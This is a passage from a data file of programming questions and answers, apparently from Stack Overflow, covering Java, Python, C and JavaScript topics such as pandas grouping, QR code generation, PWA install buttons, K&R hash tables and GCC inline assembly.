        return ""Motor name = "" + name + "", cylinders = "" + cylinders + "", bhp = "" + bhp + "", displacement = "" + displacement;
    }

}

code to print information entered 
public class VehicleTest {
public static void main(String[] args) {

    PassCar p1 = new PassCar(""Ford"", ""Mustang"", 2016, 44500.0, 5, true, ""EcoBoost"", 6, 310, 2.3);
    System.out.print(p1);
}

}
","The issue is here 
public Motor(String name, int cylinders, int bhp, double displacement) {
    super();
    this.name = name;
    this.cylinders = cylinders;
    this.bhp = bhp;
    this.displacement = displacement;
}

You've created a constructor that takes some argument but you're trying to call the constructor with no arguments here
private Motor motor = new Motor();  //cant find constructor that takes no arguments

To fix the issue you have to declare a constructor with no arguments along with your other one.
public Motor(){
 //code here
}

",java
how to download the testdata dataset of open3d python,"I have installed open3d in Raspberry Pi 4 using the documentation:
Command: pip3 install open3d
I can successfully import open3d in a Python program. But if I run the program from the tutorial:
import numpy as np
import open3d as o3d

if __name__ == ""__main__"":
    print(""Load a ply point cloud, print it, and render it"")
    pcd = o3d.io.read_point_cloud(""../../TestData/fragment.ply"")
    print(pcd)
    print(np.asarray(pcd.points))
    o3d.visualization.draw_geometries([pcd])

It gives error:
Load a ply point cloud, print it, and render it
RPly: Unable to open file
[Open3D WARNING] Read PLY failed: unable to open file: ../../TestData/fragment.ply
PointCloud with 0 points.
[]
[Open3D WARNING] The number of points is 0 when creating axis-aligned bounding box.

It looks like the TestData files are not downloaded.
So how can I download the TestData files?
","The latest version of Open3D downloads all data needed in o3d.data module. Hence, just use latest version docs available here.
P.S. Note that URL should have latest keyword in it for the most recent version docs:
https://www.open3d.org/docs/latest/tutorial/geometry/pointcloud.html
Also, notice the theme change between the old version and the new version. The new version uses furo theme which provides light/dark mode along with a right pane for easier view of class methods. For example: See https://www.open3d.org/docs/latest/python_api/open3d.geometry.TriangleMesh.html#open3d.geometry.TriangleMesh.
",python
does assembly code ignore const keyword,"Does assembly code when used(linked) in a c project ignore const keyword declared before C datatypes and functions?? And can it modify the contents of the datatypes??
","
Does assembly code when used(linked) in a c project ignore const
  keyword declared before C datatypes and functions??

Yes, the const keyword is utterly ignored by assembly code.

And can it modify the contents of the datatypes??

If the compiler was able to place a const location in a read-only segment, then assembly code trying to modify it will cause a segmentation fault. Otherwise, unpredictable behavior will result, because the compiler may have optimized parts of the code, but not others, under the assumption that const locations were not modified.
",c
how can gulp be restarted upon each gulpfile change,"I am developing a Gulpfile. Can it be made to restart as soon as it changes? I am developing it in CoffeeScript. Can Gulp watch Gulpfile.coffee in order to restart when changes are saved?
","You can create a task that will gulp.watch for gulpfile.js and simply spawn another gulp child_process.
var gulp = require('gulp'),
    argv = require('yargs').argv, // for args parsing
    spawn = require('child_process').spawn;

gulp.task('log', function() {
  console.log('CSSs has been changed');
});

gulp.task('watching-task', function() {
  gulp.watch('*.css', ['log']);
});

gulp.task('auto-reload', function() {
  var p;

  gulp.watch('gulpfile.js', spawnChildren);
  spawnChildren();

  function spawnChildren(e) {
    // kill previous spawned process
    if(p) { p.kill(); }

    // `spawn` a child `gulp` process linked to the parent `stdio`
    p = spawn('gulp', [argv.task], {stdio: 'inherit'});
  }
});

I used yargs in order to accept the 'main task' to run once we need to restart. So in order to run this, you would call:
gulp auto-reload --task watching-task

And to test, call either touch gulpfile.js or touch a.css to see the logs.
",javascript
counting based on criterias in pandas,"I have a pandas DataFrame like this:
d={'gen':['A','A','A','A','B','B','B','B','C','D','D','D','D','D','D','D','D','D','D'], 'diff':pd.Series([1,1,1,1,2,1,1,1,1,1,1,1,1,2,2,1,1,1], index=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17])}
wk = pd.DataFrame(data=d, index=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18])

my goal is to count how many occurences the gen have based on diff with some criterias:

Count if diff is 1, and
gen at index i equal to gen at index i+1, and
If there's a consecutive 1's, then the count will be like this: if (number of consecutive 1) %2 == 0: count = number of consecutive/2, if not: count = (number of consecutive - 1) /2

with this code, I can achieve what I want:
k=0
j=0
z={}
for i in range(wk.shape[0]):
    if wk['diff'][i] == 1:
        if wk['gen'][i] == wk['gen'][i+1]:
            if j == 0:
                j+=2
            if j%2==0:
                k+=1                
            if j>=2:
                j+=1
            z[wk['gen'][i]] = k
        if wk['gen'][i] != wk['gen'][i+1]:
            j=0
            k=0

and the result of dictionary z is: {'A': 2, 'B': 1, 'D': 4}
but when I used a bigger data (more than 410,000 records), the counter didn't always start from 0 when the gen at index i is not equal to gen at index i+1. What is wrong with my code?
","Count the consecutive 1s per group with groupby.count, perform a floordiv by 2 (equivalent to your x/2 if x%2==0 else (x-1)/2), and aggregate again with groupby.sum before converting to_dict:
group = wk['diff'].ne(wk.groupby('gen')['diff'].shift()).cumsum()
m = wk['diff'].eq(1)

out = (wk[m].groupby(['gen', group])      # keep only 1s and group
             ['diff'].count().floordiv(2) # count and floor division
            .groupby(level='gen').sum()   # sum per ""gen"" group
            .loc[lambda x: x>0].to_dict() # only counts > 0 and convert to dict
      )

Output:
{'A': 2, 'B': 1, 'D': 3}

Intermediates
group and m:
   gen  diff  group      m
0    A   1.0      1   True
1    A   1.0      1   True
2    A   1.0      1   True
3    A   1.0      1   True
4    B   2.0      2  False
5    B   1.0      3   True
6    B   1.0      3   True
7    B   1.0      3   True
8    C   1.0      4   True
9    D   1.0      5   True
10   D   1.0      5   True
11   D   1.0      5   True
12   D   1.0      5   True
13   D   2.0      6  False
14   D   2.0      6  False
15   D   1.0      7   True
16   D   1.0      7   True
17   D   1.0      7   True
18   D   NaN      8  False

",python
how do i generate qr code from url in javascript,"so i building a url shortner  which takes the url from python and generates a QR code in along with the shortUrl, i am using jinja2template for the UI, as i am very new to JavaScript the below code is mostly copied from Youtube and Internet.
This is the class which will show the converted shortUrl and will have a copy link button next o it
            <div class = ""result__container"">
                <div class = ""shorturl"">
                    <div id=""qrcode""></div>
                </div>
                <div>
                    <button onclick = ""copyLink()"">Copy Link</button>

                </div>
            </div>

This is the logic create the qr code I am using qrcode.min.js here to create the qrcode
    <script src=""https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js""></script>

    <script>
        const qrcode = new QRCode(document.getElementById('qrcode'), {
            text: response.shortUrl,
            width: 128,
            height: 128,
            colorDark : '#000',
            colorLight : '#fff',
            correctLevel : QRCode.CorrectLevel.H
    });


            xhr.onload = function () {
                const response = JSON.parse(this.responseText);
                console.log(this.status);
                console.log(response);
                if(this.status ==200){
                    resultContainer.style.display = ""flex"";
                    shortUrl.innerHTML = `SHORT URL :- <a href=${response.shortUrl}>${response.shortUrl}</a>`
                }
                else{
                    alert(`An error occurred, ${response.detail}`)
                }
            };

","This simple library by David Shim makes it easy!


const qrcode = new QRCode(document.getElementById('qrcode'), {
  text: 'http://jindo.dev.naver.com/collie',
  width: 128,
  height: 128,
  colorDark : '#000',
  colorLight : '#fff',
  correctLevel : QRCode.CorrectLevel.H
});
<script src=""https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js""></script>

<div id=""qrcode""></div>



You can also get really fancy with your styling and actions. here is an example I built using the same foundational code. After styling the QR code and document, I added three action buttons on hover which will download, copy, or visit the QR/source accordingly. Unfortunately, these buttons do not work in iframes due to permission issues, so they will not function in the StackOverflow snippet, or on CodePen, JSFiddle, CodeSandbox, etc. However, you can load this code into your own server to see it all work perfectly.
Here is the finished product:


const qrElement = document.getElementById('qrcode');

const qrUrl = 'https://davidshimjs.github.io/qrcodejs/';

const qrcode = new QRCode(document.getElementById('qrcode'), {
  text: qrUrl,
  width: 128,
  height: 128,
  colorDark : '#000',
  colorLight : '#fff',
  correctLevel : QRCode.CorrectLevel.H
});

const qrActionButtons = Array.from(qrElement.querySelectorAll('.qr-action'));

qrActionButtons.find(b => b.dataset.qrAction === 'visit').href = qrUrl;

document.addEventListener('click', e => {
  if (e.target) {
    if (qrActionButtons.indexOf(e.target) !== -1) {
      const button = e.target;
      const action = button.dataset.qrAction;
      if (action === 'download') {
        const a = document.createElement('a');
        a.download = 'QR-Code.png';
        a.href = qrElement.querySelector('img').src;
        console.log(a.href);
        a.click();
        a.remove();
      } else if (action === 'copy') {
        fetch(qrElement.querySelector('img').src).then(res => res.blob()).then(blob => navigator.clipboard.write([new ClipboardItem({[blob.type]:blob})]));
      } else if (action === 'visit') {
        // handled organically
      }
    }
  }
});
:root {
  --theme-color: #ff0;
  --trace-size: 6%;
  --trace-distance: 5%;
}
html, body {
  height: 100%;
  margin: 0;
  overflow: hidden;
}
body {
  background-color: var(--theme-color);
}
#qrcode {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%,-50%)
}
#qrcode {
  background-color: inherit;
  transition: all 0.15s ease-out;
}
#qrcode::before {
  content: '';
  display: block;
  width: var(--trace-size);
  height: var(--trace-size);
  position: absolute;
  background-color: #f00;
  border-radius: 20%;
  animation: 2s ease-in-out 1s infinite normal both qr-trace;
  transition: inherit;
}
#qrcode img {
  background-color: inherit;
  mix-blend-mode: darken;
  image-rendering: pixelated;
  transition: inherit;
}
#qrcode .qr-action {
  display: block;
  width: 33%;
  height: 33%;
  position: absolute;
  left: 50%;
  top: 50%;
  appearance: none;
  -moz-appearance: none;
  -webkit-appearance: none;
  background-color: transparent;
  border: none;
  border-radius: 50%;
  font-size: 20px;
  z-index: 1;
  transition: inherit;
  cursor: pointer;
  text-decoration: none !important;
  transform-style: preserve-3d;
  box-sizing: border-box;
}
#qrcode .qr-action::before,
#qrcode .qr-action::after {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  height: 100%;
  position: absolute;
  left: 0;
  top: 0;
  border-radius: 50%;
  font-family: 'Font Awesome 5 Pro';
  font-weight: 900;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  box-shadow: 0 10px 20px -10px #000;
  transform-style: preserve-3d;
  transition: all .45s ease-out;
}
#qrcode .qr-action::before {
  backface-visibility: hidden;
  transform: translateZ(0px) scale(1);
  background-color: #fff;
  color: #000;
}
#qrcode .qr-action::after {
  transform: translateZ(-1px) scale(0.95);
  background-color: #000;
  color: var(--theme-color);
}
#qrcode .qr-action[data-qr-action=""download""]::before,
#qrcode .qr-action[data-qr-action=""download""]::after {
  content: '\f381';
}
#qrcode .qr-action[data-qr-action=""copy""]::before,
#qrcode .qr-action[data-qr-action=""copy""]::after {
  content: '\f0c5';
}
#qrcode .qr-action[data-qr-action=""visit""]::before,
#qrcode .qr-action[data-qr-action=""visit""]::after {
  content: '\f0c1';
}
#qrcode .qr-action:nth-child(1) {
  transform: translate(-175%, -50%) scale(0);
}
#qrcode .qr-action:nth-child(2) {
  transform: translate(-50%, -50%) scale(0);
}
#qrcode .qr-action:nth-child(3) {
  transform: translate(75%, -50%) scale(0);
}
#qrcode .qr-action i,
#qrcode .qr-action svg {
  pointer-events: none;
}
#qrcode:hover::before {
  opacity: 0;
}
#qrcode:hover img {
  opacity: 0.5;
}
#qrcode:hover .qr-action {
  opacity: 1;
}
#qrcode:hover .qr-action:nth-child(1) {
  transform: translate(-175%, -50%) scale(1);
}
#qrcode:hover .qr-action:nth-child(2) {
  transform: translate(-50%, -50%) scale(1);
}
#qrcode:hover .qr-action:nth-child(3) {
  transform: translate(75%, -50%) scale(1);
}
#qrcode:hover .qr-action:hover::before {
  transform: translateZ(0px) scale(0.95) rotateY(180deg);
}
#qrcode:hover .qr-action:hover::after {
  transform: translateZ(-1px) scale(1) rotateY(180deg);
}
@keyframes qr-trace {
  0%, 10% {
    left: calc(-1 * (var(--trace-size) + var(--trace-distance)));
    top: calc(-1 * (var(--trace-size) + var(--trace-distance)));
    filter: hue-rotate(0deg);
  } 25%, 35% {
    left: calc(100% + var(--trace-distance));
    top: calc(-1 * (var(--trace-size) + var(--trace-distance)));
  } 50%, 60% {
    left: calc(100% + var(--trace-distance));
    top: calc(100% + var(--trace-distance));
  } 75%, 85% {
    left: calc(-1 * (var(--trace-size) + var(--trace-distance)));
    top: calc(100% + var(--trace-distance));
  } 100% {
    left: calc(-1 * (var(--trace-size) + var(--trace-distance)));
    top: calc(-1 * (var(--trace-size) + var(--trace-distance)));
    filter: hue-rotate(360deg);
  }
}
<script src=""https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js""></script>
<script src=""https://kit.fontawesome.com/07afc061fe.js"" crossorigin=""anonymous""></script>

<div id=""qrcode""><button class=""qr-action"" data-qr-action=""download""></button><button class=""qr-action"" data-qr-action=""copy""></button><a class=""qr-action"" data-qr-action=""visit"" target=""_blank"" title=""Visit QR Source""></a></div>



",javascript
threejs texture mapping with no scaling,"I'm mapping a texture of dimensions 300 x 250 to a Mesh that is 600 x 20. The texture are being scaled down, distorting the image. Anyway to prevent this?
Ideally, I want to map the texture at 300 X 20, ""cutting"" away at 20 and above 
My code is as follows.
var floorTx = THREE.ImageUtils.loadTexture( './walltile/floorTx.jpg' );
floorTx.wrapS = floorTx.wrapT = THREE.RepeatWrapping;
floorTx.repeat.set(2, 2);
var floorMat = new THREE.MeshPhongMaterial( { map: floorTx, specular: 0x050505, shininess: 100});
var floor = new THREE.Mesh(cube, floorMat );
floor.castShadow = true;
floor.receiveShadow = true;
floor.name = ""floor"";
floor.dynamic = true;
scene.add( floor );

","The key is to set the texture's repeat property according to the size of the mesh.
floorTx.repeat.set(meshWidth / textureWidth, meshHeight / textureHeight);

",javascript
when do custom elements invoke lifecycle hook formstaterestorecallback with reason argument equal to quotautocompletequot,"I tried to find examples where the formStateRestoreCallback lifecycle hook could return autocomplete as the second reason argument, but I didn't find anything.
Here is a quote from the specification:

When user agent updates a form-associated custom element's value on behalf of a user or as part of navigation, its formStateRestoreCallback is called, given the new state and a string indicating a reason, ""autocomplete"" or ""restore"", as arguments.

To get the reason with restore you just need to refresh the page with a certain custom element on the page (don't forget to use setFormValue)
customElements.define(
  ""my-input"",
  class extends HTMLElement {
    constructor() {
      super();
      this.internals_ = this.attachInternals();
      this.internals_.setFormValue(""sendData"", ""localData"");
    }
    static get formAssociated() {
      return true;
    }
    connectedCallback() {
      console.log(""connectedCallback has been invoked"");
    }
    formResetCallback() {
      console.log(""formResetCallback has been invoked"");
    }
    formStateRestoreCallback(state, mode){
      console.log(""formStateRestoreCallback:"", state, mode);
    }
  }
);

but what do you need to do to get autocomplete?
Does anyone know if this thing works?
","In the same document, a bit later you can see the specs say

If the user agent has a form-filling assist feature

I suspect this means some kind of AT.
Interestingly, WPT only checks that the property is visited, but not that the callback is ever called, not even with ""restore"".
And none of the ""big 3"" browsers seem to have implemented the ""autocomplete"" when they did implement formStateRestoreCallback.

Webkit's PR clearly states


This change implements form-associated custom elements as per spec [1], with exception of
formStateRestoreCallback() being called for autofill and support of File interface
for saving / restoring state.

(emphasize mine)
Firefox's has pretty much the same:

Note that 'autocomplete' for custom elements remains unsupported.

And in Chrome, while they do define the ""autocomplete"" mode, walking up the call hierarchy of CustomElementFormStateRestoreCallbackReaction(), we end up at a single, CustomElement::EnqueueFormStateRestoreCallback(Target(), restored_state,""restore"") with an hardcoded ""restore"" mode, no ""autocomplete"" ever.
Maybe other user agents do call it though. And for it to be called, you'd need to follow the same rules as for autocomplete to work: have your element with an name or id attribute, in a <form> with a submit button.
",javascript
how to print words that only contain letters from a list,"I have recently been trying to create a program in Python 3 which will read a text file which contains 23005 words, the user will then enter a string of 9 characters which the program will use to create words and compare them to the ones in the text file.
I want to print words which contains between 4-9 letters and that also contains the letter in the middle of my list. For example if the user enters the string ""anitsksem"" then the fifth letter ""s"" must be present in the word.
Here is how far I have gotten on my own:
# Open selected file & read
filen = open(""svenskaOrdUTF-8.txt"", ""r"")

# Read all rows and store them in a list
wordList = filen.readlines()

# Close File
filen.close()

# letterList index
i = 0
# List of letters that user will input
letterList = []
# List of words that are our correct answers
solvedList = []

# User inputs 9 letters that will be stored in our letterList
string = input(str(""Ange Nio Bokstäver: ""))
userInput = False

# Checks if user input is correct
while userInput == False:
   # if the string is equal to 9 letters
   # insert letter into our letterList.
   # also set userInput to True
    if len(string) == 9:
        userInput = True
        for char in string:
            letterList.insert(i, char)
            i += 1

    # If string not equal to 9 ask user for a new input
    elif len(string) != 9:
        print(""Du har inte angivit nio bokstäver"")
        string = input(str(""Ange Nio Bokstäver: ""))

# For each word in wordList
# and for each char within that word
# check if said word contains a letter from our letterList
# if it does and meets the requirements to be a correct answer
# add said word to our solvedList

for word in wordList:
    for char in word:
        if char in letterList:
            if len(word) >= 4 and len(word) <= 9 and letterList[4] in word:
                print(""Char:"", word)
                solvedList.append(word)

The issue that I run into is that instead of printing words which only contain letters from my letterList, it prints out words which contains at least one letter from my letterList. This also mean that some words are printed out multiple time, for example if the words contains multiple letters from letterList.
I've been trying to solve these problems for a while but I just can't seem to figure it out. I Have also tried using permutations to create all possible combinations of the letters in my list and then comparing them to my wordlist, however I felt that solution was to slow given the number of combinations which must be created.
    # For each word in wordList
    # and for each char within that word
    # check if said word contains a letter from our letterList
    # if it does and meets the requirements to be a correct answer
    # add said word to our solvedList
    for word in wordList:
        for char in word:
            if char in letterList:
                if len(word) >= 4 and len(word) <= 9 and letterList[4] in word:
                    print(""Char:"", word)
                    solvedList.append(word)

Also since I'm kind of to new to Python, if you have any general tips to share, I would really appreciate it.
","You get multiple words mainly because you iterate through each character in a given word and if that character is in the letterList you append and print it.
Instead, iterate on a word basis and not on a character basis while also using the with context managers to automatically close files:
with open('american-english') as f:
    for w in f:
        w = w.strip()
        cond = all(i in letterList for i in w) and letterList[4] in w
        if 9 > len(w) >= 4 and cond:
            print(w)

Here cond is used to trim down the if statement, all(..) is used to check if every character in the word is in letterList, w.strip() is to remove any redundant white-space.
Additionally, to populate your letterList when the input is 9 letters, don't use insert. Instead, just supply the string to list and the list will be created in a similar, but noticeably faster, fashion:
This:
if len(string) == 9:
    userInput = True
    for char in string:
        letterList.insert(i, char)
        i += 1

Can be written as:
if len(string) == 9:
    userInput = True
    letterList = list(string)

With these changes, the initial open and readlines are not needed, neither is the initialization of letterList.
",python
syntax error  missing 3939 before 39type39 c code,"Yes, it has been asked before and i have followed the advice here and put my declerations at the top still not working.
void map_delete(map_t *map, char *key) {
   assert(map_contains(map, key));

   map_elem_t *prev;
   map_elem_t *elem_to_remove;

   prev = map->elem;
   while(strcmp(prev->next->key, key) != 0) prev= prev->next;

   elem_to_remove = prev->next;
   prev->next = elem_to_remove->next;
   free(elem_to_remove);
}


map.c(74): error C2143: syntax error : missing ';' before 'type'
map.c(76): error C2065: 'prev' : undeclared identifier
map.c(76): warning C4047: '=' : 'int' differs in levels of indirection from 'map_elem_t *'
map.c(77): error C2065: 'prev' : undeclared identifier
map.c(77): error C2223: left of '->next' must point to struct/union
map.c(77): error C2198: 'strcmp' : too few arguments for call
map.c(77): error C2065: 'prev' : undeclared identifier
map.c(77): error C2065: 'prev' : undeclared identifier
map.c(77): error C2223: left of '->next' must point to struct/union
map.c(79): error C2065: 'elem_to_remove' : undeclared identifier
map.c(79): error C2065: 'prev' : undeclared identifier
map.c(79): error C2223: left of '->next' must point to struct/union
map.c(80): error C2065: 'prev' : undeclared identifier
map.c(80): error C2223: left of '->next' must point to struct/union
map.c(80): error C2065: 'elem_to_remove' : undeclared identifier
map.c(80): error C2223: left of '->next' must point to struct/union
map.c(81): error C2065: 'elem_to_remove' : undeclared identifier
map.c(81): warning C4022: 'free' : pointer mismatch for actual parameter 1

note the logic of the code is correct as it was working on another machine, its the compiler that is not happy with the layout 
","The compiler complains because assert is not a declaration. You'll need to move the assert so that it comes after the declarations.
Using a C compiler that supported a standard more recent that C89 would be a good move.
",c
pwa installation own button installation in js  html  css,"I know how to do a pwa integration and the browser proposes the installation with the message ""Add --- to the home screen"". My wish is as follows: I would like to set up on the integrated PWA website a personalized button l ""Install mobile version"" in HTML so that my users can install the progressive web app as needed, especially when they wish. They will not necessarily wait for the browser to offer them the installation. I have already done the PWA integration and the browser already offers the installation. Problem is, I don't really know how to go about my permanent web app progressive install button in html + javascript  that users will see on my website outside of what the browser offers.
Here is my service-worker.js and my index.html


var CACHE_NAME = 'PWA-installation';
var urlsToCache = [
  'index.html',
  './',
  'styles.css',
  'scripts/network.js',
  'scripts/ui.js',
  'scripts/clipboard.js',
  'scripts/theme.js',
  'sounds/blop.mp3',
  'images/favicon-96x96.png'
];

self.addEventListener('install', function(event) {
  // Perform install steps
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(function(cache) {
        console.log('Opened cache');
        return cache.addAll(urlsToCache);
      })
  );
});


self.addEventListener('fetch', function(event) {
  event.respondWith(
    caches.match(event.request)
      .then(function(response) {
        // Cache hit - return response
        if (response) {
          return response;
        }
        return fetch(event.request);
      }
    )
  );
});
<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""utf-8"">
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
    <!-- Web App Config -->
    <title>pwa</title>
    
    <link rel=""stylesheet"" type=""text/css"" href=""styles.css"">
    <link rel=""manifest"" href=""manifest.json"">
</head>

<body translate=""no"">
    <header >
      
        <a href=""#"" id=""install"" class=""icon-button"" title=""Install PWA"" >
             Install PWA
        </a>
    </header>
 
    
    <!-- Footer -->
    <footer class=""column"">
       
    </footer>
    
    <!-- Scripts -->
    <script src=""scripts/network.js""></script>
    <script src=""scripts/ui.js""></script>
    <script src=""scripts/theme.js"" async></script>
    <script src=""scripts/clipboard.js"" async></script>
   
</body>

</html>



","Your code looks fine, you only need to implement this part:
https://stackoverflow.com/a/64727286/8716572
First you need to use this code to listen to the beforeinstallprompt event:
let deferredPrompt;

window.addEventListener('beforeinstallprompt', function (e) {

  // Prevent the mini-infobar from appearing on mobile
  e.preventDefault();

  // Stash the event so it can be triggered later.
  deferredPrompt = e;
});

Then you need to add the event listener to your button:
var buttonInstall = document.getElementById('install');

buttonInstall.addEventListener('click', function (e) {
  // Show the install prompt
  deferredPrompt.prompt();
});

",javascript
how does java recognize commented applet html tag in applets program,"I used to java programs in notepad(normal text editor),Usually /*test/* would be counted as comments in a program which won't be interpreted by compiler,
For e.g 
import java.io.*;

import java.sql.*;

class products

{

public static void main(String args[])

/*test /*

Here test would be considered as comments
}

But in applets how does /* recognize it in applet viewer and generate the window based on the size and code?
/*<applet code=""myaddapplet.java"" width=""300"" height=""300"">
</applet>
*/

how does not java take it as programming content instead of taking it as comments ?
","
how does not java take it as programming content instead of taking it as comments ?

The Java compiler does not read that file.
It is an HTML file ... or something that generates one (e.g. a JSP).  The HTML is read on the client side by your web browser's HTML parser, not by a Java compiler.  In fact, it is likely that the user's machine doesn't even have a Java compiler installed.
The HTML parser does not recognize the /* ... */ as a comment.  Depending on where it is, it may treat those characters as literal characters and attempt to show them to the user.
The <applet>...</applet> part is valid HTML ... which the HTML parser recognizes, and treats as an instruction to launch an applet.
",java
what is quotexport defaultquot in javascript,"File: SafeString.js
// Build out our basic SafeString type
function SafeString(string) {
  this.string = string;
}

SafeString.prototype.toString = function() {
  return """" + this.string;
};

export default SafeString;

I have never seen export default before. Are there any equivalent stuff for export default that can be easier to understand?
","It's part of the ES6 module system, described here. There is a helpful example in that documentation, also:

If a module defines a default export:
// foo.js
export default function() { console.log(""hello!"") }

then you can import that default export by omitting the curly braces:
import foo from ""foo"";
foo(); // hello!



Update: As of June 2015, the module system is defined in §15.2 and the export syntax in particular is defined in §15.2.3 of the ECMAScript 2015 specification.
",javascript
is there difference in compilers  java,"Is there any differences in code optimization done by same versions of:

Oracle Java compiler
Apache Java compiler
IBM Java compiler
OpenJDK Java compiler

If there is what code would demonstrate different optimizations? Or are they using same compiler? If there is no known optimization differences then where could I find resources on how to test compilers for different optimizations?
","
Is there any differences in code optimization done by same versions of: Oracle Java compiler Apache Java compiler IBM Java compiler OpenJDK Java compiler.

While compiler can be very different, the javac does almost no optimisations.  The main optimisation is constant inlining and this is specified in the JLS and thus standard (except for any bugs)

If there is what code would demonstrate different optimizations?

You can do this.
final String w = ""world"";
String a = ""hello "" + w;
String b = ""hello world"";
String c = w;
String d = ""hello "" + c;
System.out.prinlnt(a == b); // these are the same String
System.out.prinlnt(c == b); // these are NOT the same String

In the first case, the constant was inlined and the String concatenated at compile time. In the second case the concatenation was performed at runtime and a new String created.

Or are they using same compiler?

No, but 99% of optimisations are performed at runtime by the JIT so these are the same for a given version of JVM.

If there is no known optimization differences then where could I find resources on how to test compilers for different optimizations?

I would be surprised if there is one as this doesn't sound very useful.  The problem is that the JIT optimises prebuilt templates of byte code and if you attempt to optimise the byte code you can end up confusing the JIT and having slower code, i.e. there is no way to evaluate an optimisation without considering the JVM it will be run on.
",java
quick way to implement dictionary in c,"One of the things which I miss while writing programs in C is a dictionary data structure. What's the most convenient way to implement one in C? I am not looking for performance, but ease of coding it from scratch. I don't want it to be generic either -- something like char*→int will do. But I do want it to be able to store an arbitrary number of items.
This is intended more as an exercise. I know that there are 3rd party libraries available which one can use. But consider for a moment, that they don't exist. In such a situation what's the quickest way you can implement a dictionary satisfying the above requirements.
","Section 6.6 of The C Programming Language presents a simple dictionary (hashtable) data structure. I don't think a useful dictionary implementation could get any simpler than this. For your convenience, I reproduce the code here. 
struct nlist { /* table entry: */
    struct nlist *next; /* next entry in chain */
    char *name; /* defined name */
    char *defn; /* replacement text */
};

#define HASHSIZE 101
static struct nlist *hashtab[HASHSIZE]; /* pointer table */

/* hash: form hash value for string s */
unsigned hash(char *s)
{
    unsigned hashval;
    for (hashval = 0; *s != '\0'; s++)
      hashval = *s + 31 * hashval;
    return hashval % HASHSIZE;
}

/* lookup: look for s in hashtab */
struct nlist *lookup(char *s)
{
    struct nlist *np;
    for (np = hashtab[hash(s)]; np != NULL; np = np->next)
        if (strcmp(s, np->name) == 0)
          return np; /* found */
    return NULL; /* not found */
}

char *strdup(char *);
/* install: put (name, defn) in hashtab */
struct nlist *install(char *name, char *defn)
{
    struct nlist *np;
    unsigned hashval;
    if ((np = lookup(name)) == NULL) { /* not found */
        np = (struct nlist *) malloc(sizeof(*np));
        if (np == NULL || (np->name = strdup(name)) == NULL)
          return NULL;
        hashval = hash(name);
        np->next = hashtab[hashval];
        hashtab[hashval] = np;
    } else /* already there */
        free((void *) np->defn); /*free previous defn */
    if ((np->defn = strdup(defn)) == NULL)
       return NULL;
    return np;
}

char *strdup(char *s) /* make a duplicate of s */
{
    char *p;
    p = (char *) malloc(strlen(s)+1); /* +1 for ’\0’ */
    if (p != NULL)
       strcpy(p, s);
    return p;
}

Note that if the hashes of two strings collide, it may lead to an O(n) lookup time. You can reduce the likelihood of collisions by increasing the value of HASHSIZE. For a complete discussion of the data structure, please consult the book.
",c
how to manipulating c variable directly not via register via inline assembly quotinclquot instruction in gcc,"I have the following code
#include <stdio.h>

volatile int global_counter = 0;

void increment_counter() {
    for (int i = 0; i < 100000; ++i) {
        //global_counter++;
        asm (""incl %0""
            :""+a""(global_counter)
        );
    }
}

int main() {

    increment_counter();
    printf(""Final value of global_counter: %d\n"", global_counter);

    return 0;
}

However, gcc with -S -O2 options compiles to the following assembly code
_increment_counter:
LFB1:
    movl    $100000, %edx
    .p2align 4,,10
    .p2align 3
L2:
    movl    _global_counter(%rip), %eax
# 8 ""x_test.c"" 1
    incl %eax
# 0 """" 2
    subl    $1, %edx
    movl    %eax, _global_counter(%rip)
    jne L2
    ret

It means that the assembly code is compiled to:
    movl    _global_counter(%rip), %eax
    incl %eax
    movl    %eax, _global_counter(%rip)

How can I make it compile to
    incl _global_counter(%rip)

directly without the movl instruction?
Is it possible to make the gcc inline assembly to use the incl instruction directly on the memory, without using the register eax?
","I am the OP. Sorry for my fault. It should be ""+m"" instead of ""+a"" for using the memory instead of register.
I modified the code to:
        asm (""incl %0"":""+m""(global_counter));

Problem solved.
",c
importerror no module named 39flask_sqlalchemy39 w 2 versions of python installed,"Tried running a file with the following imports:
from flask_sqlalchemy import sqlalchemy
from sqlalchemy import create_engine
from sqlalchemy.orm import scoped_session, sessionmaker

Received the following error:
ImportError: No module named 'flask_sqlalchemy'

SQLAlchemy is installed. Still, I tried to reinstall into the directory in which it will be used. I got this:
The directory '/Users/_/Library/Caches/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/Users/_/Library/Caches/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Requirement already satisfied: Flask-SQLAlchemy in /Library/Python/2.7/site-packages (2.3.2)
Requirement already satisfied: Flask>=0.10 in /Library/Python/2.7/site-packages (from Flask-SQLAlchemy) (1.0.2)
Requirement already satisfied: SQLAlchemy>=0.8.0 in /Library/Python/2.7/site-packages (from Flask-SQLAlchemy) (1.2.10)
Requirement already satisfied: Jinja2>=2.10 in /Library/Python/2.7/site-packages (from Flask>=0.10->Flask-SQLAlchemy) (2.10)
Requirement already satisfied: itsdangerous>=0.24 in /Library/Python/2.7/site-packages (from Flask>=0.10->Flask-SQLAlchemy) (0.24)
Requirement already satisfied: Werkzeug>=0.14 in /Library/Python/2.7/site-packages (from Flask>=0.10->Flask-SQLAlchemy) (0.14.1)
Requirement already satisfied: click>=5.1 in /Library/Python/2.7/site-packages (from Flask>=0.10->Flask-SQLAlchemy) (6.7)
Requirement already satisfied: MarkupSafe>=0.23 in /Library/Python/2.7/site-packages (from Jinja2>=2.10->Flask>=0.10->Flask-SQLAlchemy) (1.0)

The bit about me not owning the directory is incorrect. I'm the only one on this machine. I own everything. 
Anyway, I go back to rerun the file and get the same error message. So, it's installed, but not installed or, at the very least, not available to me. 
One error message I saw when I commented out one of the import statements read as follows:
File ""/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/sqlalchemy/engine/strategies.py

